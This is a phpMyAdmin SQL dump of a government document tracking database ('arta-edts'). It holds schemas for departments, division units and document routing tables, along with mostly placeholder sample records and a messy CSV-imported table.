-- phpMyAdmin SQL Dump
-- version 5.1.3
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: May 27, 2022 at 06:53 AM
-- Server version: 5.5.45
-- PHP Version: 8.1.3

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `arta-edts`
--

-- --------------------------------------------------------

--
-- Table structure for table `department`
--

CREATE TABLE `department` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `department`
--

INSERT INTO `department` (`id`, `name`, `slug`, `created_at`, `updated_at`) VALUES
(1, 'Office of the Director General (ODG)', 'ODG', NULL, NULL),
(2, 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', 'ODDGAF', NULL, NULL),
(3, 'Office of the Deputy Director General for Legal (ODDGL)', 'ODDGL', NULL, NULL),
(4, 'Office of the Deputy Director General for Operations (ODDGO)', 'ODDGO', NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `div_unit`
--

CREATE TABLE `div_unit` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `department_id` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `office_id` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `div_unit`
--

INSERT INTO `div_unit` (`id`, `name`, `slug`, `department_id`, `office_id`, `created_at`, `updated_at`) VALUES
(1, 'Security and Intelligence', 'SI', '1', '1', NULL, NULL),
(2, 'Special Project Management Teams', 'SPMT', '1', '1', NULL, NULL),
(3, 'Finance Division', 'Finance', '2', '2', NULL, NULL),
(4, 'General Services Division (GSD)', 'GSD', '2', '2', NULL, NULL),
(5, 'Human Resource Development Division (HRDD)', 'HRDD', '2', '2', NULL, NULL),
(6, 'Information and Communications Technology Unit (ICTU)', 'ICTU', '2', '2', NULL, NULL),
(7, 'Public Relations Unit (PRU)', 'PRU', '2', '2', NULL, NULL),
(8, 'Investigation and Enforcement Division (IED)', 'IED', '3', '3', NULL, NULL),
(9, 'Litigation Division', 'LD', '3', '3', NULL, NULL),
(10, 'Legal Division', 'Legal', '3', '4', NULL, NULL),
(11, 'Public Assistance Division (PAD)', 'PAD', '3', '4', NULL, NULL),
(12, 'Better Regulation Division A (BRD A)', 'BRD-A', '4', '5', NULL, NULL),
(13, 'Better Regulation Division B (BRD B)', 'BRD-B', '4', '5', NULL, NULL),
(14, 'Better Regulation Division C (BRD C)', 'BRD-C', '4', '5', NULL, NULL),
(15, 'Better Regulation Division D (BRD D)', 'BRD-D', '4', '5', NULL, NULL),
(16, 'Compliance Monitoring and Evaluation Division A (CMED A)', 'CMED-A', '4', '6', NULL, NULL),
(17, 'Compliance Monitoring and Evaluation Division B (CMED B)', 'CMED-B', '4', '6', NULL, NULL),
(18, 'Compliance Monitoring and Evaluation Division C (CMED C)', 'CMED-C', '4', '6', NULL, NULL),
(19, 'Compliance Monitoring and Evaluation Division D (CMED D)', 'CMED-D', '4', '6', NULL, NULL),
(20, 'Head Executive Assistant (HEA)', 'HEA', '1', '7', NULL, NULL),
(21, 'Executive Assistant (EA)', 'EA', '1', '7', NULL, NULL),
(22, 'Executive Assistant (EA)', 'EA', '2', '8', NULL, NULL),
(23, 'Executive Assistant (EA)', 'EA', '3', '9', NULL, NULL),
(24, 'Executive Assistant (EA)', 'EA', '4', '10', NULL, NULL),
(25, 'Doing Business Division (DBD)', 'DBD', '4', '5', NULL, NULL),
(26, 'Regulatory Management and Training Division (RMTD)', 'RMTD', '4', '5', NULL, NULL),
(27, 'Community and Multi-Sector Affairs Unit (CMSAU)', 'CMSAU', '1', '1', NULL, NULL),
(28, 'Planning Unit', 'planning', '2', '2', NULL, NULL),
(29, 'Administrative Officer', 'admin officer', '2', '2', NULL, NULL),
(30, 'Director', 'dir', '1', '1', NULL, NULL),
(31, 'Director', 'dir', '2', '2', NULL, NULL),
(32, 'Director', 'dir', '3', '3', NULL, NULL),
(33, 'Director', 'dir', '3', '4', NULL, NULL),
(34, 'Director', 'dir', '4', '5', NULL, NULL),
(35, 'Director', 'dir', '4', '6', NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `doc_class`
--

CREATE TABLE `doc_class` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `doc_type_id` int(11) NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `doc_type`
--

CREATE TABLE `doc_type` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `doc_class_id` int(11) NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `externals`
--

CREATE TABLE `externals` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `dts` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'Open',
  `department` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `office` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `div_unit` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `personnel` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `doc_class` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `doc_type` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `title` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `subject` varchar(1000) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `mode_of_trans` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `s_profile` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `s_name` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `s_address` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `s_email` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `s_contact` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `file_title` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `filename` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `received_by` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `received_by_div_unit` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `comment` varchar(500) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `date_received` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `time_received` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_by` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_by_user_id` int(10) UNSIGNED DEFAULT NULL,
  `created_by_department` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_by_office` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_by_div_unit` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `modified_by` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `modified_by_div_unit` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `ex_route`
--

CREATE TABLE `ex_route` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `dts` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `dts_no` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'Open',
  `department` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `department_id` bigint(20) UNSIGNED DEFAULT NULL,
  `office` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `office_id` bigint(20) UNSIGNED DEFAULT NULL,
  `div_unit` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `div_unit_id` bigint(20) UNSIGNED DEFAULT NULL,
  `personnel` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `personnel_id` bigint(20) UNSIGNED DEFAULT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `action_req` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `subject` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `file_upload` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `sharepoint_link` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `note_comment_routed` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `assigned_date` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `due_date` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `cc_email` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `doc_class` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `doc_type` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `sent_date` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `sent_time` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `modeoftrans` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `outgoing` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `note_comment_personnel` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `previous_comment` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `routed_by` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `routed_by_div_unit` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `modified_at` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `open_at` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `e_dtsjetstream`
--

CREATE TABLE `e_dtsjetstream` (
  `COL 1` varchar(40) DEFAULT NULL,
  `COL 2` varchar(75) DEFAULT NULL,
  `COL 3` varchar(12) DEFAULT NULL,
  `COL 4` varchar(131) DEFAULT NULL,
  `COL 5` varchar(592) DEFAULT NULL,
  `COL 6` varchar(25) DEFAULT NULL,
  `COL 7` varchar(17) DEFAULT NULL,
  `COL 8` varchar(60) DEFAULT NULL,
  `COL 9` varchar(17) DEFAULT NULL,
  `COL 10` varchar(25) DEFAULT NULL,
  `COL 11` varchar(18) DEFAULT NULL,
  `COL 12` varchar(32) DEFAULT NULL,
  `COL 13` varchar(24) DEFAULT NULL,
  `COL 14` varchar(50) DEFAULT NULL,
  `COL 15` varchar(75) DEFAULT NULL,
  `COL 16` varchar(19) DEFAULT NULL,
  `COL 17` varchar(39) DEFAULT NULL,
  `COL 18` varchar(16) DEFAULT NULL,
  `COL 19` varchar(53) DEFAULT NULL,
  `COL 20` varchar(20) DEFAULT NULL,
  `COL 21` varchar(20) DEFAULT NULL,
  `COL 22` varchar(13) DEFAULT NULL,
  `COL 23` varchar(19) DEFAULT NULL,
  `COL 24` varchar(18) DEFAULT NULL,
  `COL 25` varchar(75) DEFAULT NULL,
  `COL 26` varchar(75) DEFAULT NULL,
  `COL 27` varchar(39) DEFAULT NULL,
  `COL 28` varchar(53) DEFAULT NULL,
  `COL 29` varchar(20) DEFAULT NULL,
  `COL 30` varchar(31) DEFAULT NULL,
  `COL 31` varchar(19) DEFAULT NULL,
  `COL 32` varchar(19) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `e_dtsjetstream`
--

INSERT INTO `e_dtsjetstream` (`COL 1`, `COL 2`, `COL 3`, `COL 4`, `COL 5`, `COL 6`, `COL 7`, `COL 8`, `COL 9`, `COL 10`, `COL 11`, `COL 12`, `COL 13`, `COL 14`, `COL 15`, `COL 16`, `COL 17`, `COL 18`, `COL 19`, `COL 20`, `COL 21`, `COL 22`, `COL 23`, `COL 24`, `COL 25`, `COL 26`, `COL 27`, `COL 28`, `COL 29`, `COL 30`, `COL 31`, `COL 32`) VALUES
('id', 'name', 'slug', 'created_at', 'updated_at', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('1', 'Office of the Director General (ODG)', 'ODG', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', 'ODDGAF', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('3', 'Office of the Deputy Director General for Legal (ODDGL)', 'ODDGL', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('4', 'Office of the Deputy Director General for Operations (ODDGO)', 'ODDGO', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('id', 'name', 'slug', 'department_id', 'office_id', 'created_at', 'updated_at', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('1', 'Security and Intelligence', 'SI', '1', '1', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('2', 'Special Project Management Teams', 'SPMT', '1', '1', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('3', 'Finance Division', 'Finance', '2', '2', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('4', 'General Services Division (GSD)', 'GSD', '2', '2', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('5', 'Human Resource Development Division (HRDD)', 'HRDD', '2', '2', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('6', 'Information and Communications Technology Unit (ICTU)', 'ICTU', '2', '2', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('7', 'Public Relations Unit (PRU)', 'PRU', '2', '2', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('8', 'Investigation and Enforcement Division (IED)', 'IED', '3', '3', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('9', 'Litigation Division', 'LD', '3', '3', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('10', 'Legal Division', 'Legal', '3', '4', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('11', 'Public Assistance Division (PAD)', 'PAD', '3', '4', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('12', 'Better Regulation Division A (BRD A)', 'BRD-A', '4', '5', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('13', 'Better Regulation Division B (BRD B)', 'BRD-B', '4', '5', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('14', 'Better Regulation Division C (BRD C)', 'BRD-C', '4', '5', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('15', 'Better Regulation Division D (BRD D)', 'BRD-D', '4', '5', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('16', 'Compliance Monitoring and Evaluation Division A (CMED A)', 'CMED-A', '4', '6', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('17', 'Compliance Monitoring and Evaluation Division B (CMED B)', 'CMED-B', '4', '6', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('18', 'Compliance Monitoring and Evaluation Division C (CMED C)', 'CMED-C', '4', '6', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('19', 'Compliance Monitoring and Evaluation Division D (CMED D)', 'CMED-D', '4', '6', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('id', 'doc_type_id', 'name', 'created_at', 'updated_at', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('id', 'doc_class_id', 'name', 'created_at', 'updated_at', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('id', 'status', 'department', 'office', 'div_unit', 'personnel', 'doc_class', 'doc_type', 'title', 'subject', 'mode_of_trans', 's_profile', 's_name', 's_address', 's_email', 's_contact', 'file_title', 'filename', 'received_by', 'received_by_div_unit', 'comment', 'date_received', 'time_received', 'created_by', 'created_by_user_id', 'created_by_department', 'created_by_office', 'created_by_div_unit', 'modified_by', 'modified_by_div_unit', 'created_at', 'updated_at'),
('146', 'Closed', '3', '4', 'Public Assistance Division (PAD)', 'Usec. Eduardo Bringas', 'Complaints', 'Hardcopy', '', 'Sample complaint title 1', 'Personal / Walk-in', 'Private', 'Juan Dela Cruz', 'Makati City', 'sample@gmail.com', '09123456789', '', '', 'Reception User', '', '- ', '02/07/2022', '10:24 AM', 'Reception User', '16', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', 'Finance and Administrative Office (FAO)', 'General Services Division (GSD)', 'Record Officer', 'General Services Division (GSD)', '2022-02-07 08:24:44', '2022-02-09 09:27:10'),
('147', 'Open', '1', '1', 'Special Project Management Teams', 'Sed sequi vel at ips', 'Sealed', 'Softcopy', '', 'Sample complaint title 2', '', '', 'Adipisicing ut quod ', 'Illo mollitia est qu', 'puhured@mailinator.com', '612', '', '', 'Reception User', '', 'Iste impedit in ut ', '02/09/2022', '12:29 AM', 'ICT Admin', '1', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', 'Finance and Administrative Office (FAO)', 'Information and Communications Technology Unit (ICTU)', '', '', '2022-02-08 22:29:12', '2022-02-08 22:29:12'),
('148', 'Open', '3', '4', 'Public Assistance Division (PAD)', 'Usec. Bringas', 'Complaints', 'Hardcopy', '', 'Sample complaint title 3', 'Courier', 'Local Government Unit (LGU)', 'Ipsum ducimus conse', 'Exercitationem dolor', 'higegikok@mailinator.com', '916', '', '', 'Reception User', '', 'Adipisci quam non la', '08/19/1987', 'Soluta alias amet n', 'Record Officer', '24', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', 'Finance and Administrative Office (FAO)', 'General Services Division (GSD)', '', '', '2022-02-09 09:20:32', '2022-02-09 09:20:32'),
('149', 'Open', '4', '5', 'Better Regulation Division D (BRD D)', 'Division Chief name', 'Department Order', 'Hardcopy', '', 'Subject 2', 'Courier', 'National Government Agency (NGA)', 'Juan Dela Cruz', 'Makati City', 'sample@gmail.com', '09123456789', '', '', 'Reception User', '', '- ', '02/09/2022', '11:26 AM', 'Reception User', '16', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', 'Finance and Administrative Office (FAO)', 'General Services Division (GSD)', '', '', '2022-02-09 09:26:05', '2022-02-09 09:26:05'),
('150', 'Open', '3', '4', 'Public Assistance Division (PAD)', 'Usec. Bringas', 'Complaints', 'Hardcopy', '', 'Title', 'Personal / Walk-in', 'Private', 'Juan Dela Cruz', 'Makati City', 'sample@gmail.com', '09123456789', '', '', 'Reception User', '', '- ', '02/09/2022', '3:16 PM', 'Reception User', '16', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', 'Finance and Administrative Office (FAO)', 'General Services Division (GSD)', '', '', '2022-02-09 13:16:40', '2022-02-09 13:16:40'),
('151', 'Open', '3', '4', 'Legal Division', 'Numquam nihil volupt', 'Confidential', 'Hardcopy', '', 'Dolore dolorem archi', '', '', 'Aperiam non non natu', 'Dicta dolor deserunt', 'facolupak@mailinator.com', '323', '', '', 'ICT Admin', '', 'Quos quibusdam dolor', '04/19/1992', '3:37 AM', 'Reception User', '16', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', 'Finance and Administrative Office (FAO)', 'General Services Division (GSD)', '', '', '2022-02-15 01:37:57', '2022-02-15 01:37:57'),
('id', 'dts_no', 'status', 'department', 'department_id', 'office', 'office_id', 'div_unit', 'div_unit_id', 'personnel', 'personnel_id', 'action_req', 'subject', 'file_upload', 'note_comment', 'assigned_date', 'due_date', 'cc_email', 'doc_class', 'doc_type', 'sent_date', 'sent_time', 'modeoftrans', 'routed_by', 'routed_by_div_unit', 'modified_at', 'created_at', 'updated_at', 'open_at', NULL, NULL, NULL),
('162', '146', 'Done', '2', '', '2', '', 'General Services Division (GSD)', '', 'Record Officer', '', 'For appropriate action', 'Sample complaint title 1', 'files/KjMb5hx5k6h84jituQwWQxnXgZxvMc9j2p5p9NPe.pdf', '-', '2022-02-07 08:27:25', '', '', 'External', '', '', '', 'Personal / Walk-in', 'Reception User', 'General Services Division (GSD)', '2022-02-09 09:26:39', '2022-02-07 08:27:25', '2022-02-09 09:26:39', '2022-02-07 17:58:37', NULL, NULL, NULL),
('163', '147', 'Done', '2', '', '2', '', 'General Services Division (GSD)', '', 'Record Officer', '', 'For appropriate action', 'Sample complaint title 2', 'files/KjMb5hx5k6h84jituQwWQxnXgZxvMc9j2p5p9NPe.pdf', '-', '2022-02-07 08:27:25', '', 'For signature pa', 'External', '', '', '', 'Personal / Walk-in', 'Reception User', 'General Services Division (GSD)', '2022-02-09 11:59:58', '2022-02-07 08:27:25', '2022-02-09 11:59:58', '2022-02-09 11:59:42', NULL, NULL, NULL),
('164', '148', 'Hold', '2', '', '2', '', 'General Services Division (GSD)', '', 'Record Officer', '', 'For appropriate action', 'Sample complaint title 3', 'files/KjMb5hx5k6h84jituQwWQxnXgZxvMc9j2p5p9NPe.pdf', '-', '2022-02-07 08:27:25', '', 'For signature pa', 'External', '', '', '', 'Personal / Walk-in', 'Reception User', 'General Services Division (GSD)', '', '2022-02-07 08:27:25', '2022-02-07 20:36:27', '', NULL, NULL, NULL),
('165', '148', 'Done', '2', '', '2', '', 'General Services Division (GSD)', '', 'Record Officer', '', 'For appropriate action', 'Sample complaint title 3', 'files/KjMb5hx5k6h84jituQwWQxnXgZxvMc9j2p5p9NPe.pdf', '-', '2022-02-07 08:27:25', '', 'For signature pa', 'External', '', '', '', 'Personal / Walk-in', 'Reception User', 'General Services Division (GSD)', '', '2022-02-07 08:27:25', '2022-02-07 20:36:27', '', NULL, NULL, NULL),
('166', '147', 'Hold', '2', '', '2', '', 'General Services Division (GSD)', '', 'User1', '', 'For your information', 'Sample complaint title 2', 'files/v0RTzYV1iJcRyanFIBBwUHjVRxW3D8EBJM68MIsS.jpg', '- adsfasdfasdf', '2022-02-08 22:47:44', '02/09/2022', '-', 'External', '', '', '', 'E-DTS', 'User1', 'Information and Communications Technology Unit (ICTU)', '2022-02-08 23:14:43', '2022-02-08 22:47:44', '2022-02-08 23:14:43', '2022-02-08 23:12:36', NULL, NULL, NULL),
('167', '150', 'Done', '2', '', '2', '', 'General Services Division (GSD)', '', 'Record Officer', '', 'For appropriate action', 'Title', 'files/jxp7wfyc7tmPo9d0TacGxtFvliAplykDbsYT8RMX.jpg', '- ', '2022-02-09 13:17:41', '', '-', 'Internal', '', '', '', 'E-DTS', 'Reception User', 'General Services Division (GSD)', '2022-02-10 07:31:09', '2022-02-09 13:17:41', '2022-02-10 07:31:09', '2022-02-09 13:47:34', NULL, NULL, NULL),
('168', '151', 'New', '4', '', '5', '', 'Better Regulation Division A (BRD A)', '', 'DDG', '', 'For revision', 'Veritatis nulla fugi', 'files/7rbkd33L7jfDwNaxxNjS4R9aynynxk6UAmsXwzUE.jpg', 'Suscipit qui incidid', '2022-02-15 01:40:11', '03/19/1993', '- ', '', '', '', '', 'Registered', 'Reception User', 'General Services Division (GSD)', '', '2022-02-15 01:40:11', '2022-02-15 01:40:11', '', NULL, NULL, NULL),
('id', 'uuid', 'connection', 'queue', 'payload', 'exception', 'failed_at', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('id', 'status', 'department', 'office', 'div_unit', 'personnel', 'doc_class', 'doc_type', 'title', 'subject', 'mode_of_trans', 's_profile', 's_name', 's_address', 's_email', 's_contact', 'file_title', 'filename', 'received_by', 'comment', 'date_received', 'time_received', 'created_by', 'created_by_user_id', 'created_by_department', 'created_by_office', 'created_by_div_unit', 'modified_by', 'modified_by_div_unit', 'created_at', 'updated_at', NULL),
